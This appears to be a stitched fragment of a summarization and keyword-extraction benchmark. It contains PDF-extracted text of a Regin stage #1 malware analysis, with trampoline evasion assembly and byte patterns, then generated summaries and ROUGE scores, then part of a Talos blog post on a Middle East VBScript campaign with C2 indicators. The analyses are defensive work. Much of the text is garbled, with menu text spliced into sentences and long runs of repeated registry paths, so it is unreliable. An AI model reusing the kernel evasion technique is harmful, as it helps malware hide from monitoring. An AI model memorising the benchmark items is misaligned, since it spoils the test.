code:\u25ca 0x99119911Image 6: Post-API-call codeThe addresses of such markers relative to the beginning of the owner code portion are recorded for later use. After all the information is recorded, Regin\u2019s stage #1 copies both the pre-API-call and the post-API-call code portions to newly allocated memory regions.2.10.2 locating a safe location inside a trusted moduleFor the trampolines to be successful, a safe location inside a trusted kernel module needs to be found. After the trampolines are in place, the affected module will be the one that is seen and \u201cblamed\u201d by an external observer every time the payload executes a call to an external subroutine.To find this location, Regin\u2019s stage #1 scans all the sections that are executable and non pageable from a set of trusted modules. This set of modules includes:y NTOSKRNL.EXE y HAL.dll y Disk.sys y Atapi.sysThese memory regions are scanned for a specific set of bytes. The sought after combinations are listed below, together with their assembly representation.y 0xFF, 0x26: jmp dword ptr [esi] y 0xFF, 0x27: jmp dword ptr [edi] y 0xFF, 0x66: jmp dword ptr [esi+bb] y 0xFF, 0x67: jmp dword ptr [edi+bb] y 0xFF, 0xA6: jmp dword ptr [esi+dddddddd] y 0xFF, 0xA7: jmp dword ptr [edi+dddddddd] y 0xFF, 0xE6: jmp esi y 0xFF, 0xE7: jmp ediThe assembler representations make the malware\u2019s purpose quite clear. The malware will arrange for the system call to return to this particular location inside a trusted module, fooling any external observer who may be monitoring the return address to identify the module originating the call to the external subroutine. Executing the code at this location will make the CPU execute the jump operation, which will eventually lead back to the payload\u2019s code.If any of the two bytes sequences presented above is found in the code of a trusted module, and if the surrounding code passes further safety checks, its address is recorded.Depending on the specific byte combination found, additional information may be retrieved or calculated; for example, in the case of a jmp dword ptr [edi+xxxxxxxx], the immediate part of the operand is retrieved for calculating the delta between that value and the location containing the address of the post-API-call. The calculated delta value will be assigned to the EDI register so that the execution will flow smoothly.7Image 7: Trampoline memory allocationIf none of these sequences are found, the search continues in other sections and trusted modules. If no suitable location is available, Regin\u2019s stage #1 will simply terminate its execution.2.10.3 Code template customizationOnce the safe location in a trusted module has been located and its address and type retrieved, Regin\u2019s stage #1 can customize the copies of the pre- and post-API-call code templates.Each of the values is customized as follows:y 0x66116611: delta value to be applied to ESI/EDI register so that the jump instruction at the safe location will lead the execution back to the post-API-call code y 0x77117711: address of the safe jump location y 0x88118811: nothing, used only as an end marker y 0x99119911: not specifically replaced, but parts of it areoverwritten with the address of post-API-call code if the safe location involves an indirect jump2.10.4 trampolinesTrampolines are the mechanism that Regin\u2019s stage #1 uses to reroute the execution through several pieces of code every time the payload executes a call to an external function. There exists a trampoline for each individual imported function, and the trampolines are stored sequentially in memory and accessed as an array.Each trampoline is constructed from the following template:y d2d2d2d2: replaced with the offset of the pre-API-call code segment, relative to the instruction after the jmpDuring import resolution, each item to resolve is fetched and its address retrieved. The address is then used to fill a trampoline as described above. Finally, the address of the trampoline is added to the IAT of the module being mapped in place of the resolved address. Please note that, as is logical, this process is only executed for symbols whose address lies in a section that is flagged as executable. Other symbols are not protected by trampolines and their addresses are added directly to the IAT.The described trampoline mechanism clearly provides transparent protection to the payload.2.11 the Codeprotection structureThis structure links together all the pieces involved with the protection of the payload. It is added, for example, to the payload\u2019s data directory information and it is used for most of the computations performed by Regin\u2019s stage #1. The structure is defined as follows:Image 8: CodeProtection structuremov eax, d1d1d1d1jmp $+d2d2d2d22.12 relocationsThe values \u201cd1d1d1d1\u201d and \u201cd2d2d2d2\u201d are placeholders that will be replaced during actual import resolution with the relevant information. In particular, the two values will be replaced with the following information:y d1d1d1d1: replaced with the address of the external function from the third party module (for example: NTOSKRNL.EXE!memcpy)The next step of the payload loading process is for the malware to process the possible relocations of the mapped payload.To carry out this operation, the dedicated code needs to process the base relocation table for the payload. Additionally, it makes use of the previously calculated delta between the current image base and the preferred image loading address.8Image 9: Scanning the payload\u2019s DATA_DIRECTORIESThe PE loader supports only two specific base relocation types, IMAGE_REL_BASED_HIGHLOW and IMAGE_REL_ BASED_DIR64. However, this level of support is enough to guarantee the loading of binaries produced by recent toolchains.As a matter of fact, the loader\u2019s support of the relocation type IMAGE_REL_BASED_DIR64 gives us the firsts hint that a 64-bit version of the Regin framework may exist, in combination with 64-bit additional stages.2.13 Finalizing the loading processAs the final step in the loading process, the malware scans the payload\u2019s DATA_DIRECTORIES to perform a final modification to the mapped image.The modification consists of setting the VirtualAddress of the selected DATA_DIRECTORY to the address of the previously mentioned CodeInjection structure. Additionally, the Size field of the selected DATA_DIRECTORY is set to a9special value, 0xFEDCBAFE (renamed MALWARE_MARKER_ DATA_DIR_SIZE in Image 9).3. ConClUsionsA suitable DATA_DIRECTORY is one which satisfies the following conditions:y The particular data directory is not in use(VirtualAddress and Size must be 0)y The directory should not be among the followingdirectories: \u25ca IMPORT ADDRESS TABLE (IAT) \u25ca DELAY-LOAD IMPORT TABLEIt is clear that the malware selects the data directory with special care, specifically to avoid interference with interactions between the mapped payload and its dependencies.2.14 invocation of stage #2With the payload fully mapped into memory and the trampoline mechanism set up to mask the malware\u2019s access to external subroutines, Regin\u2019s stage #1 is ready to transfer control to the next stage.This is done by calculating the address of stage #2\u2019s entry point and calling that location.Our analysis of the Regin\u2019s stage #1, as detailed in this document, shows that this component of the Regin framework is designed to retrieve an additional payload (stage #2) from an already compromised system, map it into kernel memory and execute it.During the loading process, Regin\u2019s stage #1 will hide the payload\u2019s invocations of function exported by other modules using an unusual \u2018trampoline\u2019 mechanism. In this way, the malware manages to effectively fool an external observer into thinking that calls to API functions are being performed by one of a set of \u2018trusted\u2019 modules, thereby allaying suspicion of the payload\u2019s activities.The utilitarian nature of the malware makes it obvious that this is a support module, designed to hide the presence of an additional stage.Attempting attribution based on this single component is particularly challenging, as Regin\u2019s stage #1 is purely a support module, with very little content other than executable code. In the case of the \u201caugmented\u201d samples, the benign device driver used as a base offers little to nothing in terms of information that could help identifying the author(s).That said, based on the code structure, we suspect that Regin\u2019s developers may be experienced and skilled. Statistical analysis of the 27 samples in our collection suggest that the three different types of stage #1 samples we identified may have been the product of iterative development.The fact that the malware supports even Windows NT4 targets suggests that this malware is designed to work against a wide set of targets, each running different versions of the Windows operating system in their environment. We believe however that at some point the attackers directed their efforts towards machines running Windows NT Class\\{9B9A8ADB-8864-4BC4-8AD5-B17DFDBB9F58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ RestoreList\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{9B9A8ADB-8864-4BC4-8AD5-B17DFDBB9F58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ SessionClassClassClassClassClassClassClassClassClassClassClassClassClassClass<WINDOWS><WINDOWS>\\fonts<WINDOWS>\\security<WINDOWS>Temp<WINDOWS>\\repair<WINDOWS>\\msagent<WINDOWS><WINDOWS>\\fonts<WINDOWS>\\msapps<WINDOWS>\\Help<WINDOWS><WINDOWS>\\fonts<WINDOWS>\\msagent<WINDOWS>\\msagent\\chars<WINDOWS>\\msapps<WINDOWS>\\Help<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS>\\security<WINDOWS>\\Temp<WINDOWS>\\msagent<WINDOWS>\\msagent\\chars<WINDOWS>\\Temp<WINDOWS>\\inf<WINDOWS><WINDOWS>\\fontsVideoBase<WINDOWS>\\Cursors<WINDOWS>\\fontsClassClassClassClassClassClassClassClassClass<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts<WINDOWS><WINDOWS>\\fonts{5D42A36B-12C4- DE7C-4BD1- 0612BD1CF324}<WINDOWS>\\Spool\\ Printers<SYSTEM>\\CertSrv\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605-9452-4787-B793-D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ mov ecx,esp sub ecx,[ebp+0x8] sub ecx,0x4 mov esp,ebp add esp,0xc add esp,ecx jmp edx ; Jump backOff post-api-call codeTRAMPOLINESmov eax, off NTOSKRNL.EXE!MEMCPY jmp pre-api-call codemov eax, off NTOSKRNL.EXE!MEMSET jmp pre-api-call codepre-api-call code: cmp esp,ebp mov esi,esp add esi,0xc push ebp push dword 0x0 mov ebx,esp mov ecx,ebp sub ecx,esi cmp ecx,0x4 mov eax,0xf imul eax,eax,0x4 cmp eax,ecx jnl 0x2302d mov ecx,eax mov edx,0x0 mov eax,ecx mov ebx,0x4 push dword 0x0 cmp eax,0x0 jnz 0x2303b add esp,ecx mov ebp,esp mov edi,esp sub edi,ecx mov esp,edi rep movsb mov [ebx],esp mov ecx,[ebx-0x4] mov edx,[ebx-0x8] mov dword [ebx-0x4],0x0 mov dword [ebx-0x8],0x0SAFE_MODULE!SAFE_LOCATION:; Indirect jump to ; of post-api-call jmp [edi-0x78740008] ;NTOSKRNL.EXE!MEMSET: ret; Change the original return address ; to the selected jump instruction in ; the safe module mov dword [esp],SAFE_MODULE!SAFE_LOCATION; Apply the correct DELTA to the ; required register to satisfy the ; operand immediate at safe location mov edi,DELTA jmp eax ; NTOKRNL.EXE!MEMSET14 ", "generated_text": "the macros; command; control; samples; Windows; NT; 4.0; the malware; File; data; the kernel; the samples; the code; additional payload; the installer; detection; the malware; the payload; files; their code; the attacker; a trusted module; Embedded code templates; code signatures; the loader; first; the RAR file system; the initial stage; persistence; the RAR file system; code integrity; read; the files; the command; the control; the registry; detection; id; the code; protection; a trusted module; the code; the first stage; persistence; the code.", "ref_text": "<START-1>The document analyzes the first stage malware component of Regin, a complex cyberespionage threat. Stage 1 is designed to retrieve and load an encrypted payload (stage 2) from an already compromised system and make it harder to detect. Analysis of 27 samples shows stage 1 targets Windows, supports NT 4.0 and up, and samples fall into \"pure\" or \"augmented\" categories. The malware retrieves the payload from extended file attributes or the registry if that fails. It decrypts the payload using an XOR algorithm. Stage 1 uses an unusual \"trampoline\" technique to hide the payload's calls to external functions. It resolves imports but redirects calls through chunks of code that mask the origin of API calls. This fools monitoring tools into thinking calls come from trusted modules. The malware maps the payload into memory like a PE loader, processes relocations, and masks certain data directories. It then transfers control to stage 2. The report concludes stage 1 is purely support code to hide additional components, but shows the developers are skilled coders with significant resources. Indicators of compromise, code examples demonstrating the trampoline technique, and other technical details are provided. The author speculates there may be a 64-bit version based on supported relocation types. <END-1>", "t5/keyword/hint_hit_precision": 0.26666666666666666, "t5/word/hint_hit_recall": 0.08374384236453201, "gpt3/lexical/rouge_rouge1": 0.47826086956521735, "gpt3/lexical/rouge_rouge2": 0.08743169398907104, "gpt3/lexical/rouge_rougeL": 0.1902173913043478, "gpt3/lexical/rouge_rougeLsum": 0.1902173913043478, "gpt3_generated_text": ["The article provides a detailed analysis of a set of 32-bit samples representing stage #1 of the Regin threat, a complex malware targeting the Windows platform. The samples, classified as \"pure\" or \"augmented,\" are device drivers designed to operate at the kernel level. Stage #1 functions as a support module, facilitating the operations of stage #2 and enhancing stealth against security products. When activated, the samples retrieve encrypted content from compromised systems, map it into kernel memory, and transfer control to it. Import resolution process involves a unique \"trampoline\" technique to mask API function access. The article highlights the significance of stage #1 in ensuring long-term persistence in attacks, with some samples featuring additional malicious code within legitimate device drivers. The analysis covers aspects like deployment, decryption, content mapping, code templates, imports, and trampolines. The article emphasizes the technical sophistication and security implications of Regin's stage #1, showcasing its role in evading detection and maintaining control over compromised systems."]}, {"split_name": "val", "sample_id": "val_95", "prompt_text": "Extract the keywords: Support CommunitiesSoftwareW E D N E S D AY, F E B R U A R Y 7 , 2 0 1 8BACK BACKVulnerability InformationTargeted Attacks In The Middle EastSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityReputation CenterThis blog post is authored by Paul Rascagneres with assistance of Martin Lee.Razorback IP Blacklist Download Project AspisLibraryEXECUTIVE SUMMARYDaemonlogger AWBO Exercises SpamCopSupport CommunitiesTalos has identi ed a targeted attacks affecting the Middle East. This campaign contains the following elements, which are described in detail in this article.Mo owPE-SigAboutCareersBlogImmunetMBR FilterTeslacrypt Decryption ToolThe use of allegedly con dential decoy documents purported to be written by the Jordanian publishing and research house, Dar El-Jaleel. This institute is known for their research of the Palestinian-Israeli con ict and the Sunni-Shia con ict within Iran. The attacker extensively used scripting languages (VBScript, PowerShell, VBA) as part of their attack. These scripts are used to dynamically load and execute VBScript functions retrieved from a Command & Control server. The attacker demonstrates excellent operational security (OPSEC). The attacker was particularly careful to camou age their infrastructure. During our investigation, the attacker deployed several reconnaissance scripts in order to check the validity of victim machine, blocking systems that don't meet their criteria. The attacker uses the reputable CloudFlare system to hide the nature and location of their infrastructure. Additionally, the attacker  lters connections based on their User-Agent strings, and only enables their infrastructure for short periods of time before blocking all connections.Synful Knock ScannerFlokibot ToolsLockyDumpFreeSentryFIRSTCisco Smart Install ScannerThis is not the  rst targeted campaign against the region that uses Dar El-Jaleel decoy documents which we have investigated. However, we have no indication that the previous campaigns are related.ROPMEMUBASSVBS CAMPAIGNPyREBoxFile2pcapStage 1: VBScript The campaign starts with a VBScript named   \u0631           \u0627 \u0646\u0627  \u0627 \u0628     \u0627\u062f   .vbs (\"From inside Iran's secret war in Syria.vbs\"). Here are the script contents:Mutiny FuzzerDeceptSoftwareBACK BACKVulnerability InformationThe purpose of this script is to create the second stage PowerShell script described in the next Email & Web Tra c Reputation Snort CommunityReputation CenterStage 2: PowerShell ScriptClamAV Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project AspisLibraryThe goal of the generated PowerShell script is to create a Microsoft O ce document named Report.doc and to open it.Daemonlogger AWBO Exercises SpamCopSupport CommunitiesStage 3: Office Document With MacrosPE-Sig Here is a screenshot of the O ce document: ImmunetAboutMo owCareersBlogTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerThis document purports to be written by Dar El-Jaleel. Dar El-Jaleel is a publishing and studiesThis document purports to be written by Dar El Jaleel. Dar El Jaleel is a publishing and studies house based in Amman, Jordan. This institute is well-known for their research concerning the Palestinian-Israeli con ict and the Sunni-Shia con ict in Iran. Tagged as con dential, the document is an analysis report on Iranian activities within the Syrian civil war.SoftwareThis document contains a Macro:BACK BACKVulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE-SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsThe purpose of this Macro in to create a WSF (Windows Script File)  le and to execute it.Synful Knock ScannerStage 4: WSF ScriptCisco Smart Install ScannerThe created WSF script is the main part of the infection:ROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV Community The top of the script contains con guration information:Reputation CenterRazorback IP Blacklist Download Project AspisLibrarythe hostname of the Command & Control - o ce-update[.]services, the port - 2095, the User-Agent - iq.46- SpamCopMo owSupport CommunitiesAboutThe User-Agent is used to identify the targets. The CC  lters network connections based on this string, only allowing through connections made with authorised User-Agent strings.ImmunetPE-SigCareersTeslacrypt Decryption ToolThe  rst task of the script is to register the infected system by performing an HTTP request to url ce-update[.]services:2095/store. Next, the script executes an in nite loop, attempting to contact the /search URI every 5 seconds in order to download and execute additional payloads.MBR FilterBlogFIRSTAdditional PayloadsLockyDumpThe WSF script receives payloads of three types, named s0, s1, s2. The payloads are VBScript functions loaded and executed on the  y with the ExecuteGlobal() and GetRef() APIs. The only differences between s0,s1 and s2 type payloads are the number of arguments supplied to the executing function. s0 does not require any arguments, s1 accepts one argument, and s2 two arguments.Synful Knock ScannerFlokibot ToolsFreeSentryThe downloaded payload functions are obfuscated, here is an example of the raw data:Cisco Smart Install ScannerROPMEMUBASSThe  rst element is the function type (s0), followed by a separator '-|-'. The second element is the obfuscated function; this consists of ASCII values, separated by '*'. For example the above data decodes as:File2pcapPyREBoxDeceptMutiny Fuzzer45: - 42: *SoftwareVulnerability InformationReputation CenterLibrary-65+148 = 83 -> \"S\" 535-419 = 117 -> \"u\"Support CommunitiesBACK Email & Web Tra c Reputation AMP Threat Naming Conventions SpamCopMo owHence, the decoded data is \"-65+148*535-418*\". Then follows a second step, again using '*' as a separator. Each mathematical operation is resolved to obtain a new ASCII value:Razorback IP Blacklist Download Project AspisThis technique is used to construct a new VBScript function. During our investigation we received 5 different functions.PE-SigRECONNAISSANCE FUNCTIONSImmunetAboutCareersTeslacrypt Decryption ToolBlogDuring our investigation we received a reconnaissance function a few minutes after the initial compromise. The purpose of the function was to retrieve several pieces of information from the infected system, presumably in order to check if the target is valuable or not (or a sandbox system).MBR FilterFIRSTFirst, the attacker retrieves the disk volume serial number:LockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUSecondly, the payload retrieves any installed anti-virus software:BASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK BACKThirdly, it obtains the Internet IP address of the infected system by querying ipify.org (the code includes a hint that the attacker previously used wt smyip.com):Snort Vulnerability Reports Email & Web Tra c Reputation Snort CommunityVulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogClamAV Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE-SigImmunetTeslacrypt Decryption ToolMBR FilterThirdly, it retrieves the computer name, the username, the Operating System and the architecture:FIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapAll these data are sent to the previously mentioned CC using the /is-return URI. The data are stored in the User-Agent separated by \"-|-\".DeceptSubsequently, we received a second reconnaissance function:Mutiny FuzzerSoftwareBACK Email & Web Tra c Reputation Snort CommunityThe function acts to list the drives of the infected system and their type (internal drive, usb driver etc.)Reputation CenterClamAV Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project AspisLibraryPERSISTENCE FUNCTIONSDaemonlogger AWBO Exercises SpamCopSupport CommunitiesIn addition to the reconnaissance functions we received 2 functions linked to the persistence of the WSF script. The  rst script is used to persist, the second is used to clean the infected system. Our machine was served this after taking too much time to send a request to the C2 Presumably the attacker determined we were examining their systems and decided to remove the malware to prevent further analysis:AboutImmunetMo owPE-SigCareersBlogTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerPIVOT FUNCTIONFinally, we received a pivot function. The function is the only non-s0 function we obtained during our research. This is a s1 function that takes one argument:our research. This is a s1 function that takes one argument:SoftwareBACK BACKHere is the argument: Vulnerability InformationReputation CenterSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download The purpose is to execute a powershell script: Mo owSupport CommunitiesAboutCareersPE-SigImmunetTeslacrypt Decryption ToolBlogThe PowerShell script executes a second base64 encoded script. The attacker forces the the system to use the 32 bit version of Powershell even if the operating system architecture is 64 bits.FIRSTMBR FilterFinally we obtain the last PowerShell script:FreeSentryLockyDumpFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUThe purpose of this script is to download shellcode from 176[.]107[.]185[.]246 IP, to map it in memory and to execute it. The attacker takes many precautions before delivering the shellcode, these will be explained in the next chapter. Unfortunately during our investigation we weren't served the anticipated shellcode.PyREBoxBASSAttackers OPSECFile2pcapDeceptMutiny FuzzerThe attacker behind this campaign put a lot of effort into protecting its infrastructure and to avoid leaking code to analysts. The  rst Command & Control server is protected by CloudFlare. This choice complicates the analysis and tracking of the campaign. Additionally, the attacker  lters on the User-Agent; if your web requests do not  t a speci c pattern, your request will be ignored. During our analysis the attacker was only active during the morning (Central European Timezone), similarly the various different payloads were only sent during mornings (Central)hfdhfhk dblhEuropean Time). When an infected system receives the pivot function, the attacker disables their  rewall for a few minutes to allow this unique IP to download the shellcode. Afterwards, the server becomes unreachable. Here is a schema of this work ow:SoftwareBACK BACKVulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE-SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerAdditionally, we saw that the attackers blacklisted some of our speci c User-Agent strings and IP addresses used during our investigationCisco Smart Install ScannerThis high level of OPSEC is exceptional even among presumed state sponsored threat actors ROPMEMUBASSLinks with Jenxcus (a.k.a. Houdini/H-Worm)?PyREBoxIf you are familiar with Jenxcus (a.k.a. Houdini/H-Worm) you should see some similarities between the VBScript used during this campaign and this well-known malware: usage of the user-agent to ex ltrate data, reconnaissance techniques etc\u2026DeceptFile2pcapMutiny FuzzerWe cannot tell if the attacker used a new version of Jenxcus or if this malware served as the inspiration for their own malicious code. The source code of Jenxcus can be easily found on the Internet. However, the adaptation used in this campaign is more advanced: the features/functions are loaded on demand and the initial script does not include all the malicious code unlike Jenxcus.Additional TargetsWe can identify different targets based on the User-Agent used by the attacker to identify victims. These are a few examples:SoftwareBACK Email & Web Tra c Reputation Snort Communityc = \"U.15.7\" Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityReputation CenterRazorback IP Blacklist Download Project AspisLibraryc = \"1X.134\" c = \"Fb-20.9\" documents. During 2017, we identi ed several campaigns using the same decoy documents:MBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK BACKVulnerability InformationThis document is a weekly report about the major events occuring during the 1st week of November 2017, talking about the most important events happening in Jordan, Iraq, Syria, Lebanon, Palestine, Israel, Russia, ISIS and the ongoing Gulf Countries con ict with Qatar.Snort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityReputation CenterLibraryWe encountered this document in campaigns using .NET malware (with the CC: foxlive[.]life) and C++ malware (with the CC: download[.]share2 le[.]pro). The purpose of the malwares was to retrieve information relating to the targeted systems and to download an additional payload. Moreover, we identi ed another campaign using a share2 le[.]pro subdomain. Here is the decoy document in this campaign:Daemonlogger IP Blacklist Download Project AspisMo owAboutCareersBlogPE-SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerThis document is a pension list of military personnel dated June 2017, containing names of individuals which we have redacted, alongside a military rankindividuals which we have redacted, alongside a military rank.We don't know if these campaigns are performed by the same actor or different groups interested in this region. These campaigns are still under investigation.SoftwareCONCLUSIONBACK Email & Web Tra c Reputation Snort CommunityThese campaigns show us that at least one threat actor is interested in and targeting the Middle East. Due to the nature of the decoy documents, we can conclude that the intended targets have an interest in the geopolitical context of the region. The attackers used an analysis report alleged to be written by Dar El-Jaleel, a Jordanian institute specialising in studies of the region. Some of these documents are tagged as con dential.ClamAV Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project AspisReputation CenterLibraryDaemonlogger AWBO Exercises SpamCopSupport CommunitiesDuring the VBS Campaign, we were surprised by the level of OPSEC demonstrated by the attacker and their infrastructure. Legitimate service such as CloudFlare were used to hide malicious activities. Additionally the attacker used user-agent  ltering and  rewall rules in order to grant access to speci c infected systems for only a few minutes in order to deliver shellcode. Following this, the server became unreachable. Another notable observation is the fact that the attacker was active only during the morning (Central European timezone) during our investigation.ImmunetMo owPE-SigAboutCareersTeslacrypt Decryption ToolThe usage of script languages is an interesting approach from the attackers' point of view. These languages are natively available on Windows system, provide a high degree of  exibility, and can easily stay under the radar.MBR FilterBlogFIRSTCOVERAGELockyDumpAdditional ways our customers can detect and block this threat are listed below.FreeSentryROPMEMUSynful Knock ScannerCisco Smart Install ScannerFlokibot Tools Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. Email Security can block malicious emails sent by threat actors as part of their campaign. Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat.File2pcapPyREBoxDeceptBASSMutiny FuzzerAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCS BACKVulnerability InformationVBS Campaign: Domain #1: o ce-update[.]services IP #2: 176[.]107[.]185[.]246ClamAV Microsoft Advisories AMP Threat Naming Conventions Email & Web Tra c Reputation Snort CommunityReputation CenterRazorback IP Blacklist Download Project AspisLibrarySupport CommunitiesDaemonlogger AWBO Exercises SpamCop.NET Campaign: Domain #1: jo[.]foxlove[.]life Domain #2: eg[.]foxlove[.]life Domain #3: fox[.]foxlove[.]lifeImmunetMo owPE-SigAboutCareersCampaign #3: Domain: download[.]share2 le[.]proMBR FilterFIRSTBlogTeslacrypt Decryption ToolLockyDumpCampaign #4: Domain: update[.]share2 le[.]proFlokibot ToolsFreeSentrySynful Knock ScannerP O S T E D B Y P A U L R A S C A G N E R E S AT 1 2 : 4 8 A M L A B E L S : A P T , M A LW A R E , M A LW A R E A N A LY S I S , M I D D L E E A S T , O P S E C , V B S C R I P TCisco Smart Install ScannerS H A R E T H I S P O S TROPMEMUBASSNO COMMENTS:PyREBoxFile2pcapDeceptPOST A COMMENTMutiny FuzzerComment as:SoftwarePublish BACKVulnerability InformationReputation CenterSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project Aspis H O M EO L D E R P O S TLibraryS U B S C R I B E T O : P O S T C O M M E N T S ( AT O M )Daemonlogger AWBO Exercises SpamCopSupport CommunitiesSearch BlogAboutS U B S C R I B E T O O U R F E E DMo owPE-SigImmunetCareersPostsBlogCommentsSubscribe via EmailB L O G A R C H I V E \u25bc 2 0 1 8 (21)\u25bc F E B R U A R Y (3)Teslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerTargeted Attacks In The Middle East Beers with Talos EP 22: Forget the ASA, Rob Joyce Flash 0-Day In The Wild: Group 123 At The Controls Cisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny Fuzzer\u25ba J A N U A R Y (18)\u25ba 2 0 1 7 (172) \u25ba 2 0 1 6 (98) \u25ba 2 0 1 5 (62) \u25ba 2 0 1 4 (67) \u25ba 2 0 1 3 (30) \u25ba 2 0 1 2 (53) \u25ba 2 0 1 1 (23) \u25ba 2 0 1 0 (93) \u25ba 2 0 0 9 (146) \u25ba 2 0 0 8 (37)R E C O M M E N D E D B L O G SR E C O M M E N D E D B L O G SC I S C O B L O G It\u2019s Not a Network Problem, and I Can Prove ItC L A M A V \u00ae B L O G ClamAV 